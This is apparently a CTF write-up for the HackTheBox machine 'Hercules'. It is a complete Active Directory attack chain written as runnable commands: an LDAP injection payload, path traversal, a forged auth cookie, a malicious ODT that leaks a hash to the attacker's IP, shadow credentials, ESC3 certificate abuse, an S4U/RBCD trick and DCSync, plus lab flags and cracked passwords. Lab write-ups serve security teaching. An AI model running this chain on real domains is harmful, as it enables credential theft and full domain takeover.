# Hercules — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Windows Active Directory

---

## Overview

Hercules is a Windows DC with NTLM completely disabled — everything runs over Kerberos. The chain is long: LDAP injection on the login page, LFI to grab the web config, forging an ASP.NET auth cookie, capturing an NTLMv2 hash via a malicious ODT file, shadow credentials abuse through a BloodHound ACL chain, ESC3 certificate abuse, and finally a Kerberos S4U trick to abuse RBCD on a user account with no SPNs.

**Machine IP:** 10.129.242.196  
**My IP:** 10.10.16.109  
**Domain:** hercules.htb / dc.hercules.htb  
**User flag:** f90ff823ae901754df4e57a136b3b5fb  
**Root flag:** d27a7812f6117f6de8f88acf276c63cf  

---

## Recon

```bash
sudo nmap -Pn -sC -sV -p- --min-rate 5000 10.129.242.196 -oN hercules_scan.txt
sudo ntpdate 10.129.242.196
echo "10.129.242.196  hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
```

Typical DC open ports — 53, 88, 389, 443, 445, 636, 5986. IIS 10.0 on 443, WinRM SSL on 5986. SMB has signing required and NTLM disabled so everything needs to go through Kerberos.

IIS is vulnerable to shortname enumeration:

```bash
shortscan https://hercules.htb/
```

Found references to `web.config` and `precompiled.config` — noted for later.

---

## Web Enumeration

```bash
ffuf -u https://hercules.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc all -ac -t 100 -k
```

Only `/login` comes back 200. Everything else redirects or requires auth. Browsed to the login page — it's an SSO portal called "Hercules SSO", ASP.NET MVC app.

---

## Kerbrute — User Enumeration

Username pattern is `firstname.initialletter`. Built a custom wordlist:

```bash
awk '/^[[:space:]]*$/ {next} {
  gsub(/^[ \t]+|[ \t]+$/,"");
  for(i=97;i<=122;i++) printf "%s.%c\n", $0, i
}' /usr/share/seclists/Usernames/Names/names.txt > names_with_letters.txt

kerbrute userenum -d hercules.htb --dc 10.129.242.196 names_with_letters.txt 2>&1 | tee kerbrute_users.txt
```

---

## LDAP Injection on the Login Page

The `/Login` endpoint is injectable via the username field. The app returns two different error messages depending on whether the LDAP filter matches:

- `Invalid login attempt` → filter matched (true)
- `Invalid Username` → no match

Injection payload in the username field:

```
*)(description=<char>*
```

ASP.NET frontend blocks special chars via regex, but sending the request directly through Burp (double URL encoded) bypasses it. Wrote a Python script to brute-force the `description` field character by character as a boolean oracle.

Found `johnathan.j` has a password stored in plaintext in his AD description. Tested it:

```bash
nxc smb 10.129.242.196 -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -k
```

Works for `ken.w`. That's the first set of creds.

---

## LFI → web.config

Logged in as `ken.w`. The Downloads page has path traversal in the `fileName` parameter:

```
GET /Home/Download?fileName=../../web.config
```

Got the full `web.config` including the ASP.NET `machineKey` with both decryption and validation keys.

---

## Forging the ASP.NET Cookie → web_admin

With the machineKey I can forge a `.ASPXAUTH` cookie for any user. Used `AspNetCore.LegacyAuthCookieCompat` inside Docker to build a forged ticket for `web_admin`:

```bash
docker run --rm mcr.microsoft.com/dotnet/sdk:8.0 bash -c "
  mkdir /tmp/forge && cd /tmp/forge &&
  dotnet new console -n forge --force && cd forge &&
  dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5 &&
  dotnet run"
```

Swapped the `.ASPXAUTH` cookie in Firefox → logged in as `web_admin`. Now have access to Mail, Forms, Downloads, and Security sections.

Reading the mail as `web_admin` — there's a note about `natalie.a` being the support contact, and another email with a `.odt` payslip attachment lure. This hints that a bot is opening attachments.

---

## Bad-ODF → natalie.a NTLMv2

As `web_admin`, the Forms section accepts `.odt` uploads. Generated a malicious ODT:

```bash
git clone https://github.com/lof1sec/Bad-ODF.git
cd Bad-ODF && python3 Bad-ODF.py
# entered 10.10.16.109 when prompted
```

Started Responder and uploaded `bad.odt`:

```bash
sudo responder -I tun0 -v
```

Got `natalie.a`'s NTLMv2 hash. Cracked it:

```bash
echo 'natalie.a::HERCULES:<hash>' > natalie.hash
john --wordlist=/usr/share/wordlists/rockyou.txt natalie.hash
```

**natalie.a : Prettyprincess123!**

---

## BloodHound

```bash
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/natalie.a:'Prettyprincess123!'
export KRB5CCNAME=natalie.a.ccache
bloodhound-python -u natalie.a -p 'Prettyprincess123!' -d hercules.htb -dc dc.hercules.htb -ns 10.129.242.196 -c all
```

ACL chain:

```
natalie.a (WEB SUPPORT) → GenericWrite → bob.w
bob.w → GenericWrite → stephen.m (after OU move)
stephen.m (SECURITY HELPDESK) → ForceChangePassword → Auditor
Auditor (FOREST MANAGEMENT) → WinRM + OU takeover path
```

---

## Shadow Credentials Chain

**bob.w** (as natalie.a):

```bash
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb \
  -dc-ip 10.129.242.196 -account bob.w
```

Got bob.w's TGT and NT hash.

**Move stephen.m to Web Department OU** (as bob.w):

```bash
export KRB5CCNAME=bob.w.ccache
powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.129.242.196 --no-pass
```

```
Set-DomainObjectDN -Identity stephen.m -DestinationDN "OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
```

**stephen.m** (as natalie.a, now he's in the right OU):

```bash
export KRB5CCNAME=natalie.a.ccache
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb \
  -dc-ip 10.129.242.196 -account stephen.m
```

**ForceChangePassword on Auditor** (as stephen.m):

```bash
export KRB5CCNAME=stephen.m.ccache
bloodyad -d hercules.htb -u stephen.m -k --host dc.hercules.htb \
  --dc-ip 10.129.242.196 set password Auditor 'Hacked123!@#'
```

---

## User Flag

```bash
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/Auditor:'Hacked123!@#'
export KRB5CCNAME=Auditor.ccache
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

```
PS C:\Users\auditor\Documents> type C:\Users\auditor\Desktop\user.txt
f90ff823ae901754df4e57a136b3b5fb
```

---

## Privilege Escalation

### OU Takeover + Scheduled Task Race

Auditor is in `FOREST MANAGEMENT`. There's a SYSTEM scheduled task called "Password Cleanup" that clears `adminCount` and re-enables ACL inheritance on objects in OUs where IT Support has GenericAll. The catch is AdminSDHolder runs every ~60 minutes and keeps resetting protected accounts — so there's a race condition.

```bash
export KRB5CCNAME=Auditor.ccache
bloodyad -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.129.242.196 \
  add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
```

Then trigger the task from ashley.b's WinRM shell (ashley.b is in IT Support and has WinRM access):

```powershell
Start-ScheduledTask -TaskName "Password Cleanup"
Start-Sleep 10
Enable-ADAccount -Identity iis_administrator
Set-ADAccountPassword -Identity iis_administrator -Reset -NewPassword (ConvertTo-SecureString 'Pwned@2026!' -AsPlainText -Force)
```

```bash
impacket-getTGT 'hercules.htb/iis_administrator:Pwned@2026!' -dc-ip 10.129.242.196
export KRB5CCNAME=iis_administrator.ccache
bloodyad -d hercules.htb -u iis_administrator -k --host dc.hercules.htb \
  --dc-ip 10.129.242.196 set password 'IIS_Webserver$' 'Passw0rd@123'
```

### ESC3 — Enrollment Agent → ashley.b

`fernando.r` is in the Forest Migration OU and a member of **Smartcard Operators** — a group that can enroll in ESC3 Enrollment Agent templates.

Enable fernando.r during the cleanup window:

```bash
impacket-getTGT 'hercules.htb/fernando.r:NewPass@123!' -dc-ip 10.129.242.196
export KRB5CCNAME=fernando.r.ccache

# Step 1 — get an Enrollment Agent certificate
certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template EnrollmentAgent -dc-ip 10.129.242.196 \
  -target dc.hercules.htb -dc-host dc.hercules.htb

# Step 2 — request a cert on behalf of ashley.b
certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template User -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx \
  -dc-ip 10.129.242.196 -target dc.hercules.htb -dc-host dc.hercules.htb -dcom

# Step 3 — authenticate as ashley.b via PKINIT
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.242.196 -domain hercules.htb
```

Got ashley.b's TGT and NT hash.

### S4U Session Key Trick

`DC$` has RBCD configured trusting `IIS_Webserver$`. But `IIS_Webserver$` is a **user account with no SPNs** — every time I tried standard S4U2Proxy it came back with `KDC_ERR_BADOPTION`.

The reason: S4U2Self+U2U encrypts the ticket with the **TGT session key**. When S4U2Proxy fires, the KDC tries to decrypt that ticket using the account's **long-term key** (the NT hash derived key). Since they're different values, the KDC rejects it.

The fix — make them the same value. Get a TGT, pull the session key out of it, then change the NT hash to that exact value. The important detail is to use `impacket-changepasswd -newhashes` and NOT `bloodyad set password`. bloodyad syncs all keys (NT + AES-128 + AES-256), which breaks things. -newhashes only touches the NT hash.

```bash
# Get TGT using NT hash from the password we set
impacket-getTGT 'hercules.htb/IIS_Webserver$' -hashes ':NThash' -dc-ip 10.129.242.196
export KRB5CCNAME='IIS_Webserver$.ccache'

# Extract session key — need Type 23 (RC4), not Type 18 (AES)
python3 -c "
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('IIS_Webserver\$.ccache')
for c in cc.credentials:
    print(f'Type: {int(c[\"key\"][\"keytype\"])}')
    print(f'Session Key: {c[\"key\"][\"keyvalue\"].hex()}')
"

# Change ONLY the NT hash to the session key value
impacket-changepasswd 'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
  -newhashes ':session-key-here' \
  -hashes ':current-nt-hash' \
  -dc-ip 10.129.242.196 -k

# S4U now works because NT hash == session key
impacket-getST -spn 'cifs/dc.hercules.htb' -impersonate Administrator \
  -dc-ip 10.129.242.196 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
```

Got `Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache`.

### DCSync

```bash
export KRB5CCNAME='Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache'
impacket-secretsdump -k -no-pass dc.hercules.htb \
  -dc-ip 10.129.242.196 -just-dc-user administrator
```

Got the Administrator NT hash.

### Root Flag

```bash
impacket-getTGT 'hercules.htb/administrator' -hashes ':NThash' -dc-ip 10.129.242.196
export KRB5CCNAME=administrator.ccache
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

Root flag is at `C:\Users\Admin\Desktop\` not the default `Administrator` path:

```
PS C:\Users\Administrator\Documents> type C:\Users\Admin\Desktop\root.txt
d27a7812f6117f6de8f88acf276c63cf
```

---

## Things I Learned

**LDAP injection as a boolean oracle** — two different error messages is all you need. No error-based or time-based required. Just extract the attribute character by character.

**AdminSDHolder timing** — protected accounts (adminCount=1) get ACLs reset every ~60 minutes. You need to trigger the cleanup task and act within the window before the reset happens. Have your commands ready before you pull the trigger.

**bloodyad vs impacket-changepasswd** — bloodyad `set password` syncs all encryption keys. `impacket-changepasswd -newhashes` only updates the NT hash. This distinction is what makes the S4U trick work.

**S4U session key trick** — if a user account (no SPNs) is trusted for RBCD, standard S4U2Proxy fails. Setting the NT hash equal to the TGT RC4 session key makes the KDC's decryption succeed because it uses the long-term key to decrypt the S4U2Self ticket, and that key is now the same value.

---

*Akshat Singh (Pexpo) | HTB | 2026-07-31*
